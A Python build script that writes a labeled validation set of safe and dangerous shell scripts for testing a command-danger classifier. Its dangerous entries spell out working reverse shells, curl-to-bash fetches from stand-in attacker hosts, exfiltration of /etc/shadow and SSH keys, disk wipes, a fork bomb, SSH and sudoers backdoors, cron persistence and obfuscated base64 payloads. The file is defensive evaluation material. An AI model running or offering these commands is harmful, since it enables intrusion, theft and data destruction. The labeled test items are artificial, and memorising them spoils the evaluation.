"""Build the ACTE real-world external validation set.

Why this exists
---------------
The main ACTE corpus is synthetic (template-generated). Synthetic benchmarks
always invite one objection: *maybe the model only learned the templates.* This
module answers that objection with an **independent external holdout** of
hand-authored, realistic shell scripts drawn from publicly documented idioms —
NOT produced by ``data/generate_dataset.py`` and NEVER used for training or
threshold tuning. The evaluation protocol trains ACTE on the *entire* synthetic
corpus and then measures it, once, on these scripts. That is a genuine
train-synthetic / test-real generalization test.

Provenance and honesty
-----------------------
* Every script here is a realistic, self-contained artifact, written to resemble
  scripts a real operator or attacker would actually run — multi-line, with
  real command structure, not single-token template fills.
* Sources are *public, well-documented idioms*: standard sysadmin/devops tasks
  on the safe side; classic, publicly catalogued attack techniques on the
  dangerous side (reverse shells as documented by PentestMonkey / GTFOBins, the
  canonical bash fork bomb, ``curl | sh`` bootstrap installers, device-wipe
  ``dd``/``mkfs``, SSH ``authorized_keys`` backdoors, cron persistence). No
  private data, no live endpoints, no working credentials.
* Ground-truth labels reflect the security-conservative stance used throughout
  this project: a script is ``dangerous`` (1) if running it as written could
  compromise, destroy, or exfiltrate from the host, and ``safe`` (0) otherwise.
  The two deliberately hard cases — a *trusted-vendor* ``curl | sh`` installer
  and a *legitimate* privileged package install — are documented inline so the
  labeling decision is auditable, not hidden.

Re-running ``python -m data.real_world.build`` rewrites the ``.sh`` files and
the manifest byte-for-byte (there is no randomness here).
"""

from __future__ import annotations

import json
import os
from typing import List, Tuple

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPTS_DIR = os.path.join(HERE, "scripts")
MANIFEST = os.path.join(HERE, "manifest.jsonl")


# Each entry: (id, label, category, source, rationale, script)
# label: 1 = dangerous, 0 = safe
_SCRIPTS: List[Tuple[str, int, str, str, str, str]] = [
    # ---------------------------------------------------------------- SAFE ---
    ("rw_safe_git_release", 0, "devops", "common CI idiom",
     "Tags and pushes a release; touches only the local repo and its remote.",
     "#!/usr/bin/env bash\n"
     "set -euo pipefail\n"
     "# Tag the current commit and push the tag to origin.\n"
     "version=\"$(cat VERSION)\"\n"
     "git add -A\n"
     "git commit -m \"Release ${version}\"\n"
     "git tag -a \"v${version}\" -m \"v${version}\"\n"
     "git push origin main --tags\n"),

    ("rw_safe_docker_build", 0, "devops", "standard container build",
     "Builds and tags a Docker image from a local Dockerfile.",
     "#!/bin/bash\n"
     "set -e\n"
     "# Build and tag the application image.\n"
     "IMAGE=\"myapp:$(git rev-parse --short HEAD)\"\n"
     "docker build -t \"$IMAGE\" .\n"
     "docker tag \"$IMAGE\" myapp:latest\n"
     "echo \"Built $IMAGE\"\n"),

    ("rw_safe_pg_backup", 0, "sysadmin", "routine database backup",
     "Dumps a Postgres database to a compressed, dated file under /var/backups.",
     "#!/usr/bin/env bash\n"
     "set -euo pipefail\n"
     "DB=\"appdb\"\n"
     "OUT=\"/var/backups/${DB}_$(date +%F).sql.gz\"\n"
     "pg_dump \"$DB\" | gzip > \"$OUT\"\n"
     "echo \"Wrote $OUT\"\n"),

    ("rw_safe_logrotate_find", 0, "sysadmin", "log housekeeping",
     "Compresses service logs older than 30 days in place; bounded to /var/log.",
     "#!/usr/bin/env bash\n"
     "set -e\n"
     "# Gzip nginx logs older than 30 days.\n"
     "find /var/log/nginx -type f -name '*.log' -mtime +30 -exec gzip {} \\;\n"),

    ("rw_safe_rsync_mirror", 0, "sysadmin", "backup mirror",
     "Mirrors a project directory to a backup volume with rsync.",
     "#!/usr/bin/env bash\n"
     "set -euo pipefail\n"
     "SRC=\"/srv/www/app/\"\n"
     "DST=\"/mnt/backup/app/\"\n"
     "rsync -a --delete \"$SRC\" \"$DST\"\n"),

    ("rw_safe_ssh_keygen", 0, "devops", "key generation for deploy",
     "Generates an ed25519 keypair locally; creates no backdoor.",
     "#!/bin/bash\n"
     "set -e\n"
     "ssh-keygen -t ed25519 -f ~/.ssh/deploy_key -N '' -C 'deploy@ci'\n"
     "echo 'Public key:'\n"
     "cat ~/.ssh/deploy_key.pub\n"),

    ("rw_safe_certbot_renew", 0, "sysadmin", "TLS maintenance",
     "Renews certificates and reloads nginx; standard cron maintenance job.",
     "#!/usr/bin/env bash\n"
     "set -e\n"
     "certbot renew --quiet\n"
     "systemctl reload nginx\n"),

    ("rw_safe_disk_report", 0, "sysadmin", "read-only monitoring",
     "Prints a disk/memory summary; entirely read-only.",
     "#!/usr/bin/env bash\n"
     "echo '== Disk ==' ; df -h\n"
     "echo '== Memory ==' ; free -h\n"
     "echo '== Top dirs ==' ; du -sh /var/* 2>/dev/null | sort -h | tail -n 10\n"),

    ("rw_safe_venv_setup", 0, "dev", "python project setup",
     "Creates a virtualenv and installs pinned requirements.",
     "#!/usr/bin/env bash\n"
     "set -euo pipefail\n"
     "python3 -m venv .venv\n"
     "source .venv/bin/activate\n"
     "pip install --upgrade pip\n"
     "pip install -r requirements.txt\n"),

    ("rw_safe_tar_extract", 0, "dev", "release artifact handling",
     "Downloads a release tarball to disk and extracts it; no piping to a shell.",
     "#!/bin/bash\n"
     "set -e\n"
     "curl -fsSL https://example.com/releases/app-1.2.3.tar.gz -o /tmp/app.tgz\n"
     "mkdir -p /opt/app\n"
     "tar -xzf /tmp/app.tgz -C /opt/app\n"),

    ("rw_safe_user_service", 0, "sysadmin", "account provisioning",
     "Creates a locked service account with no login shell.",
     "#!/usr/bin/env bash\n"
     "set -euo pipefail\n"
     "sudo useradd -r -s /usr/sbin/nologin appsvc\n"
     "sudo install -d -o appsvc -g appsvc /var/lib/appsvc\n"),

    ("rw_safe_iptables_allow", 0, "sysadmin", "firewall configuration",
     "Adds an inbound allow rule for HTTPS; tightens rather than weakens.",
     "#!/bin/bash\n"
     "set -e\n"
     "sudo ufw allow 443/tcp\n"
     "sudo ufw reload\n"),

    ("rw_safe_openssl_selfsigned", 0, "devops", "local dev certificate",
     "Generates a self-signed cert for local development.",
     "#!/usr/bin/env bash\n"
     "set -euo pipefail\n"
     "openssl req -x509 -newkey rsa:4096 -nodes \\\n"
     "  -keyout dev.key -out dev.crt -days 365 \\\n"
     "  -subj '/CN=localhost'\n"),

    ("rw_safe_apt_install", 0, "sysadmin", "HARD CASE: trusted privileged install",
     "Privileged apt install from official repos. Uses sudo but is safe; labeled "
     "safe to test that ACTE does not flag routine privileged maintenance.",
     "#!/usr/bin/env bash\n"
     "set -euo pipefail\n"
     "sudo apt-get update\n"
     "sudo apt-get install -y nginx jq htop\n"),

    ("rw_safe_docker_prune", 0, "devops", "space reclamation",
     "Prunes dangling Docker objects; affects only unused Docker state.",
     "#!/bin/bash\n"
     "docker system prune -f\n"
     "docker volume prune -f\n"),

    ("rw_safe_journal_tail", 0, "sysadmin", "read-only log review",
     "Follows recent service logs; read-only.",
     "#!/bin/bash\n"
     "journalctl -u ssh -n 200 --no-pager\n"),

    ("rw_safe_chmod_normalize", 0, "sysadmin", "HARD CASE: recursive chmod on web root",
     "Recursive chmod 750 on a web root to standard permissions. Uses -R on a "
     "system path but is a normal, non-destructive maintenance task (label 0).",
     "#!/usr/bin/env bash\n"
     "set -e\n"
     "sudo chown -R www-data:www-data /var/www/html\n"
     "sudo chmod -R 750 /var/www/html\n"),

    ("rw_safe_swapfile", 0, "sysadmin", "capacity management",
     "Creates and enables a swap file; standard provisioning.",
     "#!/usr/bin/env bash\n"
     "set -euo pipefail\n"
     "sudo fallocate -l 2G /swapfile\n"
     "sudo chmod 600 /swapfile\n"
     "sudo mkswap /swapfile\n"
     "sudo swapon /swapfile\n"),

    ("rw_safe_grep_audit", 0, "dev", "read-only code search",
     "Greps a codebase for a TODO marker; read-only.",
     "#!/bin/bash\n"
     "grep -rn 'TODO' ./src | head -n 50\n"),

    ("rw_safe_dd_file_copy", 0, "sysadmin", "HARD CASE: dd between regular files",
     "Uses dd to copy one regular file to another (an image backup). dd is a "
     "scary command but the target is NOT a block device, so this is safe (0).",
     "#!/usr/bin/env bash\n"
     "set -euo pipefail\n"
     "dd if=/var/images/golden.img of=/var/backups/golden.img bs=4M status=progress\n"),

    # ----------------------------------------------------------- DANGEROUS ---
    ("rw_danger_bash_revshell", 1, "network_egress", "PentestMonkey /dev/tcp reverse shell",
     "Interactive bash shell redirected to an attacker TCP socket — a reverse shell.",
     "#!/bin/bash\n"
     "# maintenance helper\n"
     "exec 5<>/dev/tcp/203.0.113.9/4444\n"
     "bash -i >&5 0>&5 2>&5\n"),

    ("rw_danger_nc_revshell", 1, "network_egress", "netcat reverse shell (GTFOBins)",
     "Netcat executing /bin/sh back to a remote host — a reverse shell.",
     "#!/bin/bash\n"
     "nc -e /bin/sh 198.51.100.7 9001\n"),

    ("rw_danger_python_revshell", 1, "network_egress", "Python socket reverse shell (documented)",
     "Python one-liner opening a socket and spawning an interactive shell.",
     "#!/bin/bash\n"
     "python3 -c 'import socket,os,pty;"
     "s=socket.socket();s.connect((\"203.0.113.9\",4444));"
     "[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'\n"),

    ("rw_danger_perl_revshell", 1, "network_egress", "Perl reverse shell (PentestMonkey)",
     "Perl reverse shell connecting back to an attacker and exec'ing /bin/sh.",
     "#!/bin/bash\n"
     "perl -e 'use Socket;$i=\"198.51.100.7\";$p=1337;"
     "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
     "connect(S,sockaddr_in($p,inet_aton($i)));"
     "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
     "exec(\"/bin/sh -i\");'\n"),

    ("rw_danger_curl_pipe_bash", 1, "network_egress", "untrusted curl|bash",
     "Fetches a script from an untrusted host and executes it directly.",
     "#!/bin/bash\n"
     "# one-line bootstrap\n"
     "set -e\n"
     "curl -fsSL http://malware.test/bootstrap.sh | sudo bash -s -- --yes\n"),

    ("rw_danger_wget_o_shell", 1, "network_egress", "wget -O- piped to shell",
     "Streams a remote payload straight into a shell interpreter.",
     "#!/bin/bash\n"
     "wget -qO- http://c2.example.net/p.sh | sh\n"),

    ("rw_danger_forkbomb", 1, "destructive", "canonical bash fork bomb",
     "Classic fork bomb: recursively spawns processes until the host is exhausted.",
     "#!/bin/bash\n"
     "# performance test harness\n"
     "echo 'starting load test'\n"
     ":(){ :|:& };:\n"),

    ("rw_danger_rm_root", 1, "destructive", "rm -rf / with guard disabled",
     "Recursive force delete of the root filesystem with the safety guard off.",
     "#!/bin/bash\n"
     "sudo rm -rf / --no-preserve-root\n"),

    ("rw_danger_dd_wipe", 1, "destructive", "dd zero-wipe of a disk",
     "Overwrites a raw block device with zeros, destroying all data on it.",
     "#!/bin/bash\n"
     "# securely erase the decommissioned drive\n"
     "sudo dd if=/dev/urandom of=/dev/sda bs=4M status=progress\n"),

    ("rw_danger_mkfs", 1, "destructive", "reformat a mounted disk",
     "Creates a fresh filesystem on a device, erasing everything on it.",
     "#!/bin/bash\n"
     "sudo mkfs.ext4 /dev/nvme0n1\n"),

    ("rw_danger_find_delete", 1, "destructive", "catastrophic find -delete",
     "Deletes every file from root downward, sidestepping literal 'rm -rf /'.",
     "#!/bin/bash\n"
     "find / -type f -delete 2>/dev/null\n"),

    ("rw_danger_ssh_backdoor", 1, "persistence", "authorized_keys backdoor",
     "Injects an attacker public key to grant persistent remote SSH access.",
     "#!/bin/bash\n"
     "mkdir -p ~/.ssh\n"
     "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC-attacker-key' >> ~/.ssh/authorized_keys\n"
     "chmod 600 ~/.ssh/authorized_keys\n"),

    ("rw_danger_sudoers_nopasswd", 1, "privilege", "passwordless sudo persistence",
     "Grants a user passwordless root via /etc/sudoers — privilege escalation.",
     "#!/bin/bash\n"
     "echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\n"),

    ("rw_danger_cron_persist", 1, "persistence", "cron persistence + remote exec",
     "Installs a cron job that periodically fetches and runs remote code.",
     "#!/bin/bash\n"
     "(crontab -l 2>/dev/null; "
     "echo '*/5 * * * * curl -s http://c2.example.net/b | bash') | crontab -\n"),

    ("rw_danger_passwd_exfil", 1, "exfiltration", "credential exfiltration",
     "Reads the shadow password file and ships it to a remote host.",
     "#!/bin/bash\n"
     "cat /etc/shadow | nc 185.243.5.7 5555\n"),

    ("rw_danger_curl_upload_secrets", 1, "exfiltration", "data upload to remote",
     "Uploads SSH private keys off the host to an attacker endpoint.",
     "#!/bin/bash\n"
     "curl -s -F 'file=@/root/.ssh/id_rsa' http://attacker.example.com/collect\n"),

    ("rw_danger_base64_payload", 1, "obfuscation", "base64-decoded payload to shell",
     "Decodes a base64 blob and pipes the result to a shell — hidden execution.",
     "#!/bin/bash\n"
     "echo Y3VybCAtcyBodHRwOi8vYmFkLXRlc3QvcHwgYmFzaAo= | base64 -d | bash\n"),

    ("rw_danger_eval_hex", 1, "obfuscation", "eval of decoded command",
     "Uses eval on a decoded string to run a concealed destructive command.",
     "#!/bin/bash\n"
     "eval \"$(echo 'cm0gLXJmIH4vKgo=' | base64 --decode)\"\n"),

    ("rw_danger_disable_security", 1, "tampering", "disable defenses + wipe logs",
     "Stops auditd, flushes the firewall, and wipes logs — anti-forensic tampering.",
     "#!/bin/bash\n"
     "systemctl stop auditd\n"
     "iptables -F\n"
     "rm -rf /var/log/*\n"
     "history -c\n"),

    ("rw_danger_chmod_etc", 1, "tampering", "world-writable /etc",
     "Recursively makes /etc world-writable, destroying the security posture.",
     "#!/bin/bash\n"
     "sudo chmod -R 777 /etc\n"),

    ("rw_danger_trusted_installer", 1, "network_egress",
     "HARD CASE: trusted-vendor curl|sh bootstrap",
     "A real-world 'trusted' installer (rustup/nvm-style) piped to sh. Labeled "
     "DANGEROUS to match this project's stance that piping remote code to a "
     "shell is the risk pattern regardless of vendor; the hardest false-positive "
     "case for the safe class.",
     "#!/bin/bash\n"
     "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\n"),
]


def build(verbose: bool = True) -> List[dict]:
    os.makedirs(SCRIPTS_DIR, exist_ok=True)
    for fn in os.listdir(SCRIPTS_DIR):
        if fn.endswith(".sh"):
            os.remove(os.path.join(SCRIPTS_DIR, fn))

    records: List[dict] = []
    for sid, label, category, source, rationale, script in _SCRIPTS:
        rel = os.path.join("scripts", f"{sid}.sh")
        with open(os.path.join(HERE, rel), "w", encoding="utf-8") as fh:
            fh.write(script)
        records.append({
            "id": sid,
            "category": category,
            "label": int(label),
            "label_name": "dangerous" if label == 1 else "safe",
            "rationale": rationale,
            "template": "real-world",
            "path": os.path.join("real_world", rel),
            "provenance": "real-world/public-documented-idiom",
            "source": source,
            "n_chars": len(script),
            "n_lines": script.count("\n"),
        })

    with open(MANIFEST, "w", encoding="utf-8") as fh:
        for rec in records:
            fh.write(json.dumps(rec) + "\n")

    if verbose:
        n_pos = sum(r["label"] for r in records)
        print(f"Built {len(records)} real-world scripts "
              f"({n_pos} dangerous, {len(records) - n_pos} safe)")
    return records


if __name__ == "__main__":
    build()
